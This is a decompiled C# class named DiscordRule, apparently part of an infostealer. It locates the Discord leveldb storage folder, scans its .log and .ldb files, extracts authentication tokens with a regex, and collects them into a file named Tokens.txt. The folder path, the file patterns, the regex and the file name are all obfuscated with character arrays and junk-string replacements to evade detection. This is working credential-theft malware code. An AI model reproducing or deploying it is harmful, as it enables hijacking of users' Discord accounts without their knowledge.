using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

// Token: 0x02000019 RID: 25
public class DiscordRule : FileScannerRule
{
	// Token: 0x06000065 RID: 101 RVA: 0x000059B3 File Offset: 0x00003BB3
	public override string GetFolder(FileScannerArg scannerArg, FileInfo fileInfo)
	{
		return string.Empty;
	}

	// Token: 0x06000066 RID: 102 RVA: 0x000059BC File Offset: 0x00003BBC
	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			string directory = Environment.ExpandEnvironmentVariables(new string(new char[]
			{
				'%',
				'a',
				'p',
				'p',
				'd',
				'a',
				't',
				'a',
				'%',
				'\\',
				'd',
				'i',
				's',
				'c',
				'o',
				'r',
				'd',
				'\\',
				'L',
				'o',
				'c',
				'a',
				'l',
				' ',
				'S',
				't',
				'o',
				'r',
				'a',
				'g',
				'e',
				'\\',
				'l',
				'e',
				'v',
				'e',
				'l',
				'd',
				'b'
			}));
			list.Add(new FileScannerArg
			{
				Directory = directory,
				Pattern = "-*.lo--g".Replace("-", string.Empty),
				Recoursive = false
			});
			list.Add(new FileScannerArg
			{
				Directory = directory,
				Pattern = "1*.1l1d1b".Replace("1", string.Empty),
				Recoursive = false
			});
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x06000067 RID: 103 RVA: 0x00005A68 File Offset: 0x00003C68
	public static IEnumerable<ScannedFile> GetTokens()
	{
		List<ScannedFile> list = FileScanner.Scan(new FileScannerRule[]
		{
			new DiscordRule()
		});
		StringBuilder stringBuilder = new StringBuilder();
		foreach (ScannedFile scannedFile in list)
		{
			try
			{
				foreach (object obj in Regex.Matches(Encoding.UTF8.GetString(scannedFile.Body), new string(new char[]
				{
					'[',
					'A',
					'S',
					't',
					'r',
					'i',
					'n',
					'g',
					'-',
					'Z',
					'a',
					'S',
					't',
					'r',
					'i',
					'n',
					'g',
					'-',
					'z',
					'\\',
					'd',
					']',
					'{',
					'2',
					'S',
					't',
					'r',
					'i',
					'n',
					'g',
					'4',
					'}',
					'\\',
					'.',
					'[',
					'S',
					't',
					'r',
					'i',
					'n',
					'g',
					'\\',
					'w',
					'-',
					']',
					'{',
					'S',
					't',
					'r',
					'i',
					'n',
					'g',
					'6',
					'}',
					'\\',
					'.',
					'[',
					'\\',
					'w',
					'S',
					't',
					'r',
					'i',
					'n',
					'g',
					'-',
					']',
					'{',
					'2',
					'S',
					't',
					'r',
					'i',
					'n',
					'g',
					'7',
					'}'
				}).Replace("String", string.Empty)))
				{
					Match match = (Match)obj;
					try
					{
						string value = match.ToString().Trim();
						if (!stringBuilder.ToString().Contains(value))
						{
							stringBuilder.AppendLine(value);
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}
		yield return new ScannedFile
		{
			Body = Encoding.ASCII.GetBytes(stringBuilder.ToString()),
			NameOfFile = new string(new char[]
			{
				'T',
				'R',
				'e',
				'p',
				'l',
				'a',
				'c',
				'e',
				'o',
				'k',
				'R',
				'e',
				'p',
				'l',
				'a',
				'c',
				'e',
				'e',
				'n',
				'R',
				'e',
				'p',
				'l',
				'a',
				'c',
				'e',
				's',
				'.',
				't',
				'R',
				'e',
				'p',
				'l',
				'a',
				'c',
				'e',
				'x',
				't'
			}).Replace("Replace", string.Empty)
		};
		yield break;
	}
}
